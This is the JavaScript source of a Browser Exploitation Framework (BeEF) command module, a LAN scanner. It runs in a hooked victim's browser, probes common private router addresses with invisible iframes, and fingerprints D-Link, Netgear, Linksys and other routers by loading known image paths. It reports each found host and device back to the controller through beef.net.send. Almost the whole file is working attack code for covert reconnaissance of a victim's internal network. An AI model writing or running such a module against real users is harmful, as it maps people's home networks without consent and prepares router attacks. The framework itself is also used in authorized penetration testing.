//
// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//
// Ported to BeEF from jslanscanner: https://code.google.com/p/jslanscanner/source/browse/trunk/lan_scan/js/lan_scan.js

beef.execute(function() {

	if(!beef.browser.isFF() && !beef.browser.isS()){
		beef.debug("[command #<%= @command_id %>] Browser is not supported.");
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser", beef.are.status_error());
		return;
	}

//------------------------------------------------------------------------------------------
//  LAN SCANNER created by Gareth Heyes (gareth at businessinfo co uk)
//  Blog: www.thespanner.co.uk
//  Labs site : www.businessinfo.co.uk
//  Version 2.1	
//------------------------------------------------------------------------------------------

/*  Copyright 2007  Gareth Heyes  (email : gareth[at]NOSPAM businessinfo(dot)(co)(dot)uk

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

	var devices = [
		{make:'DLink',model:'dgl4100',graphic:'/html/images/dgl4100.jpg'},
		{make:'DLink',model:'dgl4300',graphic:'/html/images/dgl4300.jpg'},
		{make:'DLink',model:'di524',graphic:'/html/images/di524.jpg'},
		{make:'DLink',model:'di624',graphic:'/html/images/di624.jpg'},
		{make:'DLink',model:'di624s',graphic:'/html/images/di624s.jpg'},
		{make:'DLink',model:'di724gu',graphic:'/html/images/di724gu.jpg'},
		{make:'DLink',model:'dilb604',graphic:'/html/images/dilb604.jpg'},
		{make:'DLink',model:'dir130',graphic:'/html/images/dir130.jpg'},
		{make:'DLink',model:'dir330',graphic:'/html/images/dir330.jpg'},
		{make:'DLink',model:'dir450',graphic:'/html/images/dir450.jpg'},
		{make:'DLink',model:'dir451',graphic:'/html/images/dir451.jpg'},
		{make:'DLink',model:'dir615',graphic:'/html/images/dir615.jpg'},
		{make:'DLink',model:'dir625',graphic:'/html/images/dir625.jpg'},
		{make:'DLink',model:'dir635',graphic:'/html/images/dir635.jpg'},
		{make:'DLink',model:'dir655',graphic:'/html/images/dir655.jpg'},
		{make:'DLink',model:'dir660',graphic:'/html/images/dir660.jpg'},
		{make:'DLink',model:'ebr2310',graphic:'/html/images/ebr2310.jpg'},
		{make:'DLink',model:'kr1',graphic:'/html/images/kr1.jpg'},
		{make:'DLink',model:'tmg5240',graphic:'/html/images/tmg5240.jpg'},
		{make:'DLink',model:'wbr1310',graphic:'/html/images/wbr1310.jpg'},
		{make:'DLink',model:'wbr2310',graphic:'/html/images/wbr2310.jpg'},
		{make:'DLink',model:'dsl604',graphic:'/html/images/dsl604.jpg'},
		{make:'DLink',model:'dsl2320b',graphic:'/html/images/dsl2320b.jpg'},
		{make:'DLink',model:'dsl2540b',graphic:'/html/images/dsl2540b.jpg'},
		{make:'DLink',model:'dsl2640b',graphic:'/html/images/dsl2640b.jpg'},
		{make:'DLink',model:'dsl302g',graphic:'/html/images/dsl302g.jpg'},
		{make:'DLink',model:'dsl502g',graphic:'/html/images/dsl502g.jpg'},
		{make:'DLink',model:'dgl3420',graphic:'/html/images/dgl3420.jpg'},
		{make:'DLink',model:'dwl2100ap',graphic:'/html/images/dwl2100ap.jpg'},
		{make:'DLink',model:'dwl2130ap',graphic:'/html/images/dwl2130ap.jpg'},
		{make:'DLink',model:'dwl2200ap',graphic:'/html/images/dwl2200ap.jpg'},
		{make:'DLink',model:'dwl2230ap',graphic:'/html/images/dwl2230ap.jpg'},
		{make:'DLink',model:'dwl2700ap',graphic:'/html/images/dwl2700ap.jpg'},
		{make:'DLink',model:'dwl3200ap',graphic:'/html/images/dwl3200ap.jpg'},
		{make:'DLink',model:'dwl7100ap',graphic:'/html/images/dwl7100ap.jpg'},
		{make:'DLink',model:'dwl7130ap',graphic:'/html/images/dwl7130ap.jpg'},
		{make:'DLink',model:'dwl7200ap',graphic:'/html/images/dwl7200ap.jpg'},
		{make:'DLink',model:'dwl7230ap',graphic:'/html/images/dwl7230ap.jpg'},
		{make:'DLink',model:'dwl7700ap',graphic:'/html/images/dwl7700ap.jpg'},
		{make:'DLink',model:'dwl8200ap',graphic:'/html/images/dwl8200ap.jpg'},
		{make:'DLink',model:'dwl8220ap',graphic:'/html/images/dwl8220ap.jpg'},
		{make:'DLink',model:'dwlag132',graphic:'/html/images/dwlag132.jpg'},
		{make:'DLink',model:'dwlag530',graphic:'/html/images/dwlag530.jpg'},
		{make:'DLink',model:'dwlag660',graphic:'/html/images/dwlag660.jpg'},
		{make:'DLink',model:'dwlag700ap',graphic:'/html/images/dwlag700ap.jpg'},
		{make:'DLink',model:'dwlg120',graphic:'/html/images/dwlg120.jpg'},
		{make:'DLink',model:'dwlg122',graphic:'/html/images/dwlg122.jpg'},
		{make:'DLink',model:'dwlg132',graphic:'/html/images/dwlg132.jpg'},
		{make:'DLink',model:'dwlg510',graphic:'/html/images/dwlg510.jpg'},
		{make:'DLink',model:'dwlg520',graphic:'/html/images/dwlg520.jpg'},
		{make:'DLink',model:'dwlg520m',graphic:'/html/images/dwlg520m.jpg'},
		{make:'DLink',model:'dwlg550',graphic:'/html/images/dwlg550.jpg'},
		{make:'DLink',model:'dwlg630',graphic:'/html/images/dwlg630.jpg'},
		{make:'DLink',model:'dwlg650',graphic:'/html/images/dwlg650.jpg'},
		{make:'DLink',model:'dwlg650m',graphic:'/html/images/dwlg650m.jpg'},
		{make:'DLink',model:'dwlg680',graphic:'/html/images/dwlg680.jpg'},
		{make:'DLink',model:'dwlg700ap',graphic:'/html/images/dwlg700ap.jpg'},
		{make:'DLink',model:'dwlg710',graphic:'/html/images/dwlg710.jpg'},
		{make:'DLink',model:'dwlg730ap',graphic:'/html/images/dwlg730ap.jpg'},
		{make:'DLink',model:'dwlg820',graphic:'/html/images/dwlg820.jpg'},
		{make:'DLink',model:'wda1320',graphic:'/html/images/wda1320.jpg'},
		{make:'DLink',model:'wda2320',graphic:'/html/images/wda2320.jpg'},
		{make:'DLink',model:'wna1330',graphic:'/html/images/wna1330.jpg'},
		{make:'DLink',model:'wna2330',graphic:'/html/images/wna2330.jpg'},
		{make:'DLink',model:'wua1340',graphic:'/html/images/wua1340.jpg'},
		{make:'DLink',model:'wua2340',graphic:'/html/images/wua2340.jpg'},
		{make:'DLink',model:'DSL502T',graphic:'/html/images/help_p.jpg'},
		{make:'DLink',model:'DSL524T',graphic:'/html/images/device.gif'},
		{make:'Netgear',model:'CG814WG',graphic:'/images/../settingsCG814WG.gif'},
		{make:'Netgear',model:'CM212',graphic:'/images/../settingsCM212.gif'},
		{make:'Netgear',model:'DG632',graphic:'/images/../settingsDG632.gif'},
		{make:'Netgear',model:'DG632B',graphic:'/images/../settingsDG632B.gif'},
		{make:'Netgear',model:'DG814',graphic:'/images/../settingsDG814.gif'},
		{make:'Netgear',model:'DG824M',graphic:'/images/../settingsDG824M.gif'},
		{make:'Netgear',model:'DG834',graphic:'/images/../settingsDG834.gif'},
		{make:'Netgear',model:'DG834B',graphic:'/images/../settingsDG834B.gif'},
		{make:'Netgear',model:'DG834G',graphic:'/images/../settingsDG834G.gif'},
		{make:'Netgear',model:'DG834GB',graphic:'/images/../settingsDG834GB.gif'},
		{make:'Netgear',model:'DG834GT',graphic:'/images/../settingsDG834GT.gif'},
		{make:'Netgear',model:'DG834GTB',graphic:'/images/../settingsDG834GTB.gif'},
		{make:'Netgear',model:'DG834GV',graphic:'/images/../settingsDG834GV.gif'},
		{make:'Netgear',model:'dg834N',graphic:'/images/../settingsdg834N.gif'},
		{make:'Netgear',model:'DG834PN',graphic:'/images/../settingsDG834PN.gif'},
		{make:'Netgear',model:'DGFV338',graphic:'/images/../settingsDGFV338.gif'},
		{make:'Netgear',model:'DM111P',graphic:'/images/../settingsDM111P.gif'},
		{make:'Netgear',model:'DM602',graphic:'/images/../settingsDM602.gif'},
		{make:'Netgear',model:'FM114P',graphic:'/images/../settingsFM114P.gif'},
		{make:'Netgear',model:'FR114P',graphic:'/images/../settingsFR114P.gif'},
		{make:'Netgear',model:'FR114W',graphic:'/images/../settingsFR114W.gif'},
		{make:'Netgear',model:'FR314',graphic:'/images/../settingsFR314.gif'},
		{make:'Netgear',model:'FR318',graphic:'/images/../settingsFR318.gif'},
		{make:'Netgear',model:'FR328S',graphic:'/images/../settingsFR328S.gif'},
		{make:'Netgear',model:'FV318',graphic:'/images/../settingsFV318.gif'},
		{make:'Netgear',model:'FVG318',graphic:'/images/../settingsFVG318.gif'},
		{make:'Netgear',model:'FVL328',graphic:'/images/../settingsFVL328.gif'},
		{make:'Netgear',model:'FVM318',graphic:'/images/../settingsFVM318.gif'},
		{make:'Netgear',model:'FVS114',graphic:'/images/../settingsFVS114.gif'},
		{make:'Netgear',model:'FVS124G',graphic:'/images/../settingsFVS124G.gif'},
		{make:'Netgear',model:'FVS318',graphic:'/images/../settingsFVS318.gif'},
		{make:'Netgear',model:'FVS328',graphic:'/images/../settingsFVS328.gif'},
		{make:'Netgear',model:'FVS338',graphic:'/images/../settingsFVS338.gif'},
		{make:'Netgear',model:'FVX538',graphic:'/images/../settingsFVX538.gif'},
		{make:'Netgear',model:'FWAG114',graphic:'/images/../settingsFWAG114.gif'},
		{make:'Netgear',model:'FWG114P',graphic:'/images/../settingsFWG114P.gif'},
		{make:'Netgear',model:'GA302T',graphic:'/images/../settingsGA302T.gif'},
		{make:'Netgear',model:'GA311',graphic:'/images/../settingsGA311.gif'},
		{make:'Netgear',model:'GA511',graphic:'/images/../settingsGA511.gif'},
		{make:'Netgear',model:'GA620',graphic:'/images/../settingsGA620.gif'},
		{make:'Netgear',model:'GA621',graphic:'/images/../settingsGA621.gif'},
		{make:'Netgear',model:'GA622T',graphic:'/images/../settingsGA622T.gif'},
		{make:'Netgear',model:'HE102',graphic:'/images/../settingsHE102.gif'},
		{make:'Netgear',model:'HR314',graphic:'/images/../settingsHR314.gif'},
		{make:'Netgear',model:'JFS516',graphic:'/images/../settingsJFS516.gif'},
		{make:'Netgear',model:'JFS524',graphic:'/images/../settingsJFS524.gif'},
		{make:'Netgear',model:'JFS524F',graphic:'/images/../settingsJFS524F.gif'},
		{make:'Netgear',model:'JGS516',graphic:'/images/../settingsJGS516.gif'},
		{make:'Netgear',model:'JGS524',graphic:'/images/../settingsJGS524.gif'},
		{make:'Netgear',model:'JGS524F',graphic:'/images/../settingsJGS524F.gif'},
		{make:'Netgear',model:'KWGR614',graphic:'/images/../settingsKWGR614.gif'},
		{make:'Netgear',model:'ME101',graphic:'/images/../settingsME101.gif'},
		{make:'Netgear',model:'ME102',graphic:'/images/../settingsME102.gif'},
		{make:'Netgear',model:'ME103',graphic:'/images/../settingsME103.gif'},
		{make:'Netgear',model:'MR314',graphic:'/images/../settingsMR314.gif'},
		{make:'Netgear',model:'MR814',graphic:'/images/../settingsMR814.gif'},
		{make:'Netgear',model:'RH340',graphic:'/images/../settingsRH340.gif'},
		{make:'Netgear',model:'RH348',graphic:'/images/../settingsRH348.gif'},
		{make:'Netgear',model:'RM356',graphic:'/images/../settingsRM356.gif'},
		{make:'Netgear',model:'RO318',graphic:'/images/../settingsRO318.gif'},
		{make:'Netgear',model:'RP114',graphic:'/images/../settingsRP114.gif'},
		{make:'Netgear',model:'RP334',graphic:'/images/../settingsRP334.gif'},
		{make:'Netgear',model:'RP614',graphic:'/images/../settingsRP614.gif'},
		{make:'Netgear',model:'RT311',graphic:'/images/../settingsRT311.gif'},
		{make:'Netgear',model:'RT314',graphic:'/images/../settingsRT314.gif'},
		{make:'Netgear',model:'RT328',graphic:'/images/../settingsRT328.gif'},
		{make:'Netgear',model:'RT338',graphic:'/images/../settingsRT338.gif'},
		{make:'Netgear',model:'WAB102',graphic:'/images/../settingsWAB102.gif'},
		{make:'Netgear',model:'WAG102',graphic:'/images/../settingsWAG102.gif'},
		{make:'Netgear',model:'WAG302',graphic:'/images/../settingsWAG302.gif'},
		{make:'Netgear',model:'WAGL102',graphic:'/images/../settingsWAGL102.gif'},
		{make:'Netgear',model:'WAGR614',graphic:'/images/../settingsWAGR614.gif'},
		{make:'Netgear',model:'WG102',graphic:'/images/../settingsWG102.gif'},
		{make:'Netgear',model:'WG111',graphic:'/images/../settingsWG111.gif'},
		{make:'Netgear',model:'WG111T',graphic:'/images/../settingsWG111T.gif'},
		{make:'Netgear',model:'WG302',graphic:'/images/../settingsWG302.gif'},
		{make:'Netgear',model:'WG311',graphic:'/images/../settingsWG311.gif'},
		{make:'Netgear',model:'WG602',graphic:'/images/../settingsWG602.gif'},
		{make:'Netgear',model:'WGE101',graphic:'/images/../settingsWGE101.gif'},
		{make:'Netgear',model:'WGE111',graphic:'/images/../settingsWGE111.gif'},
		{make:'Netgear',model:'WGL102',graphic:'/images/../settingsWGL102.gif'},
		{make:'Netgear',model:'WGM124',graphic:'/images/../settingsWGM124.gif'},
		{make:'Netgear',model:'WGR101',graphic:'/images/../settingsWGR101.gif'},
		{make:'Netgear',model:'WGR614',graphic:'/images/../settingsWGR614.gif'},
		{make:'Netgear',model:'WGT624',graphic:'/images/../settingsWGT624.gif'},
		{make:'Netgear',model:'WGT624SC',graphic:'/images/../settingsWGT624SC.gif'},
		{make:'Netgear',model:'WGT634U',graphic:'/images/../settingsWGT634U.gif'},
		{make:'Netgear',model:'WGU624',graphic:'/images/../settingsWGU624.gif'},
		{make:'Netgear',model:'WGX102',graphic:'/images/../settingsWGX102.gif'},
		{make:'Netgear',model:'WN121T',graphic:'/images/../settingsWN121T.gif'},
		{make:'Netgear',model:'WN311B',graphic:'/images/../settingsWN311B.gif'},
		{make:'Netgear',model:'WN311T',graphic:'/images/../settingsWN311T.gif'},
		{make:'Netgear',model:'WN511B',graphic:'/images/../settingsWN511B.gif'},
		{make:'Netgear',model:'WN511T',graphic:'/images/../settingsWN511T.gif'},
		{make:'Netgear',model:'WN802T',graphic:'/images/../settingsWN802T.gif'},
		{make:'Netgear',model:'WNR834B',graphic:'/images/../settingsWNR834B.gif'},
		{make:'Netgear',model:'WNR834M',graphic:'/images/../settingsWNR834M.gif'},
		{make:'Netgear',model:'WNR854T',graphic:'/images/../settingsWNR854T.gif'},
		{make:'Netgear',model:'WPN802',graphic:'/images/../settingsWPN802.gif'},
		{make:'Netgear',model:'WPN824',graphic:'/images/../settingsWPN824.gif'},
		{make:'Netgear',model:'XM128',graphic:'/images/../settingsXM128.gif'},
		{make:'Thomson',model:'Cable Modem A801',graphic:'/images/thomson.gif'},
		{make:'Vigor',model:'2600V',graphic:'/images/logo1.jpg'},
		{make:'Linksys',model:'WRT54GL',graphic:'/WRT56GL.gif'},
		{make:'Linksys',model:'WRT54GC',graphic:'/UI_Linksys.gif'},
		{make:'Linksys',model:'WRT54G',graphic:'/WRT54G.gif'},
		{make:'Linksys',model:'WRT54GS',graphic:'/UILinksys.gif'},
		{make:'ZyXEL',model:'Prestige 660H61',graphic:'/dslroutery/imgshop/full/NETZ1431.jpg'},
		{make:'ZyXEL',model:'Zywall',graphic:'/images/Logo.gif'},
		{make:'Sitecom',model:'WL114',graphic:'/slogo.gif'},
		{make:'2Wire',model:'1000 Series',graphic:'/base/web/def/def/images/nav_sl_logo.gif'},				
		{make:'SurfinBird',model:'313',graphic:'/images/help_p.gif'},
		{make:'SMC',model:'7004ABR',graphic:'/images/logo.gif'},
		{make:'DLink',model:'DI524',graphic:'/m524.gif'},
		{make:'Cisco',model:'2600',graphic:'/images/logo.png'},
		{make:'ASUS',model:'RX Series',graphic:'/images/banner_sys4bg.gif'},
		{make:'ASUS',model:'RT Series',graphic:'/images/EZSetup_button.gif'}
	];

	// No signatures for commented out IPs
	var ips = [
		{ip:'192.168.1.30',make:'DLink'},
		{ip:'192.168.1.50',make:'DLink'},
		{ip:'192.168.2.1',make:'SMC'},
		//{ip:'192.168.2.1',make:'Accton'},
		//{ip:'192.168.1.1',make:'3Com'},
		//{ip:'192.168.1.1',make:'AirLink'},
		//{ip:'192.168.1.1',make:'Arescom'},
		//{ip:'192.168.1.1',make:'Teletronics'},
		//{ip:'192.168.1.1',make:'Dell'},
		{ip:'192.168.1.1',make:'DLink'},
		{ip:'192.168.1.1',make:'Linksys'},
		{ip:'192.168.1.1',make:'ZyXEL'},
		{ip:'192.168.1.1',make:'ASUS'},
		{ip:'192.168.0.1',make:'DLink'},
		{ip:'192.168.0.1',make:'Netgear'},
		{ip:'192.168.0.1',make:'Linksys'},
		{ip:'192.168.0.1',make:'SurfinBird'},
		{ip:'192.168.0.1',make:'ASUS'},
		{ip:'192.168.0.227',make:'Netgear'},
		{ip:'192.168.0.254',make:'DLink'},
		{ip:'192.168.1.225',make:'Linksys'},
		{ip:'192.168.1.226',make:'Linksys'},
		{ip:'192.168.1.245',make:'Linksys'},
		{ip:'192.168.1.246',make:'Linksys'},
		{ip:'192.168.1.251',make:'Linksys'},
		{ip:'192.168.100.1',make:'Thomson'},
		{ip:'192.168.1.254',make:'ZyXEL'},
		{ip:'192.168.1.254',make:'2Wire'},
		{ip:'192.168.0.1',make:'Vigor'},
		{ip:'192.168.123.254',make:'Sitecom'},
		//{ip:'10.0.1.1',make:'Apple'},
		{ip:'10.1.1.1',make:'DLink'},
		{ip:'10.0.0.1',make:'ZyXEL'},
		//{ip:'10.0.0.2',make:'Aceex'},
		//{ip:'10.0.0.2',make:'Bausch'},
		//{ip:'10.0.0.2',make:'E-Tech'},
		//{ip:'10.0.0.2',make:'JAHT'},
		{ip:'192.168.1.254',make:'2Wire'},
		{ip:'192.168.65.1',make:'Cisco'}
		//{ip:'192.168.100.1',make:'Motorola'},
		//{ip:'192.168.100.1',make:'Ambit'},
	];

	var guesses = [
		{host:'10.1.1.1',label:'Device',labelText:'DLink',port:80},
		{host:'10.0.0.1',label:'Device',labelText:'ZyXEL',port:80},
		{host:'10.0.0.2',label:'Device',labelText:'Aceex,Bausch,E-Tech,JAHT',port:80},
		{host:'10.0.0.138',label:'Device',labelText:'Alcatel',port:80},
		{host:'10.0.1.1',label:'Device',labelText:'Apple',port:80},	
		{host:'192.168.0.1',label:'Device',labelText:'DLink,Netgear,ASUS,Linksys,Sitecom,Belkin',port:80},		
		{host:'192.168.0.227',label:'Device',labelText:'Netgear',port:80},
		{host:'192.168.0.254',label:'Device',labelText:'DLink,Sitecom/Linux IP Cop',port:80},		
		{host:'192.168.1.1',label:'Device',labelText:'3Com,AirLink,Linksys,Arescom,ASUS,Dell,DLink,ZyXEL,Teletronics',port:80},
		{host:'192.168.1.30',label:'Device',labelText:'DLink',port:80},
		{host:'192.168.1.50',label:'Device',labelText:'DLink,Linksys',port:80},
		{host:'192.168.1.225',label:'Device',labelText:'Linksys',port:80},
		{host:'192.168.1.226',label:'Device',labelText:'Linksys',port:80},
		{host:'192.168.1.245',label:'Device',labelText:'Linksys',port:80},
		{host:'192.168.1.246',label:'Device',labelText:'Linksys',port:80},
		{host:'192.168.1.251',label:'Device',labelText:'Linksys',port:80},
		{host:'192.168.1.254',label:'Device',labelText:'ZyXEL',port:80},		
		{host:'192.168.2.1',label:'Device',labelText:'Accton,Belkin,Microsoft,SMC',port:80},
		{host:'192.168.2.25',label:'Device',labelText:'SMC',port:80},
		{host:'192.168.8.1',label:'Device',labelText:'Aceex',port:80},
		{host:'192.168.11.1',label:'Device',labelText:'Buffalo',port:80},
		{host:'192.168.62.1',label:'Device',labelText:'Canyon',port:80},
		{host:'192.168.100.1',label:'Device',labelText:'Ambit,Thomson,Motorola',port:80},
		{host:'192.168.123.254',label:'Device',labelText:'US Robotics',port:80},
		{host:'192.168.123.254',label:'Device',labelText:'Sitecom',port:80},
		{host:'192.168.254.254',label:'Device',labelText:'Flowpoint',port:80},
		{host:'192.168.254.1',label:'Device',labelText:'BT M5861,2Wire',port:80}	
	];

	lanScanner = {timeout:1,probes:0};
	//lol pardon the innuendo
	lanScanner.handleProbe = function(portObj) {
		if(portObj.init == 1) {
			lanScanner.addDevice({host:portObj.host,make:portObj.make,model:portObj.model});		
			document.body.removeChild(portObj);
		} 
	}
	// ie sucks! onload doesn't work unless specified directly in the document
	// that's why I have to do this :(
	lanScanner.handleConnection = function(portObj) {
		if(portObj.init == 1) {
			if(beef.browser.isIE()) {
				portObj.end = new Date().getTime();		
				if(portObj.end - portObj.start > 15000) {			
					document.body.removeChild(portObj);
					return false;			
				}
			}	
			var obj = portObj.store;
			obj.status = 'Open';			
			lanScanner.addHost(obj);
			document.body.removeChild(portObj);
		} else {
			portObj.start = new Date().getTime();
		}
	}
	lanScanner.runScan = function() {
		var obj, portObj;
		guessesLen = guesses.length;
		for(var i=0;i<guessesLen;i++) {
			obj = guesses[i];
			currentPort = obj.port;
			currentAddress = obj.host+':'+currentPort;
			beef.debug("[JS LAN Scanner] Connecting to: " + currentAddress);
			portObj = document.getElementById('connection'+i);
			portObj.src = 'http://'+currentAddress;
			portObj.store = obj;
			portObj.init = 1;
			document.body.appendChild(portObj);
		}
	}
	lanScanner.getPortName = function(port) {
		var portNames = {'HTTP Server':80,'FTP Server':21};
		for(var i in portNames) {
			if(portNames[i] == port) {
				return i;
			}
		}
		return 'Unknown';
	}
	lanScanner.addHost = function(obj) {
		this.timeout = 0;
		beef.debug("[JS LAN Scanner] Found "+this.getPortName(obj.port)+" [proto: http, ip: "+obj.host+", port: "+obj.port+"]");
		beef.net.send("<%= @command_url %>", <%= @command_id %>, 'proto=http&ip='+obj.host+'&port='+obj.port+'&service='+this.getPortName(obj.port), beef.are.status_success());
		lanScanner.fingerPrint(obj.host);
	}
	lanScanner.addDevice = function(obj) {
		beef.debug("[JS LAN Scanner] Found " + obj.make + ' ' + obj.model + ' [ip: ' + obj.host + ']');
		beef.net.send("<%= @command_url %>", <%= @command_id %>, 'ip='+obj.host+'&device='+obj.make+' '+obj.model, beef.are.status_success());
	}
	lanScanner.destroyConnections = function() {
		var guessesLen = guesses.length;
		for(var f=0;f<guessesLen;f++) {
			document.body.removeChild(document.getElementById('connection'+f));
		}
	}
	lanScanner.fingerPrint = function(address) {
		var make,fingerprint;
		for(var i=0;i<ips.length;i++) {
			if(ips[i].ip == address) {
				make = ips[i].make;						
				for(var k=0;k<devices.length;k++) {
					if(devices[k].make == make) {
						var img = new Image();
						img.setAttribute("style","visibility:hidden");
						img.setAttribute("width","0");
						img.setAttribute("height","0");
						img.id = 'probe'+this.probes;
						img.name = 'probe'+this.probes;
						img.onerror = function() { document.body.removeChild(this); }
						img.onload = function() { lanScanner.handleProbe(this); }
						img.init = 1;		
						img.model = devices[k].model;
						img.make = make;
						img.host = address;
						img.src = 'http://' + address + devices[k].graphic;										
						this.probes++;
						document.body.appendChild(img);
					}
				}
			}
		}
	}

	var guessesLen = guesses.length;
	for(var f=0;f<guessesLen;f++) {
		var iframe = beef.dom.createInvisibleIframe();
		iframe.name = "connection"+f;
		iframe.id = "connection"+f;
		iframe.onload = function() {
			lanScanner.handleConnection(this);
		}
	}
	beef.debug("[JS LAN Scanner] Starting scan ("+guessesLen+" IPs)");
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "Starting scan ("+guessesLen+" IPs)");
	lanScanner.runScan();
	//lanScanner.destroyConnections();
});

